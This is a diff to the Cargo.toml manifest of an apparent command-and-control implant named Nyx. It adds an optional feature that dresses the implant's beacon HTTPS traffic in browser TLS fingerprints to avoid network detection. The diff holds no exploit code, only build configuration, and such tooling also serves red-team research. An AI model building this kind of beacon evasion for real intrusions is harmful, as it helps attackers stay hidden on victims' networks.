@@ -9,12 +9,27 @@ description = "Nyx std-based dev/POSIX implant — proves the protocol loop on t
 nyx-protocol = { workspace = true }
 nyx-profile = { workspace = true }
 nyx-bof-runner = { workspace = true }
+nyx-transport = { workspace = true }
 ureq = { workspace = true }
 hex = { workspace = true }
 rand = { workspace = true }
 tracing = { workspace = true }
 tracing-subscriber = { workspace = true }
 anyhow = { workspace = true }
+# BoringSSL-backed HTTP client with browser TLS presets (mirrors the
+# nyx-transport optional dep; needed directly to name `wreq::Body`).
+wreq = { version = "5.3", default-features = false, features = ["json"], optional = true }
+# Tokio runtime used to drive the async wreq client from the agent's
+# synchronous beacon loop when the `impersonation` feature is on (wreq's
+# connect layer requires a live Tokio reactor).
+tokio = { workspace = true, optional = true }
+
+[features]
+# Browser TLS impersonation (BoringSSL wreq backend). Off by default so the
+# dev build stays hermetic; on, the beacon's HTTPS egress carries a real
+# browser ClientHello (Chrome/Firefox/Safari/Edge) via
+# nyx-transport::fingerprint::build_impersonating_client.
+impersonation = ["nyx-transport/impersonation", "dep:wreq", "dep:tokio"]
 
 [dev-dependencies]
 tempfile = "3"
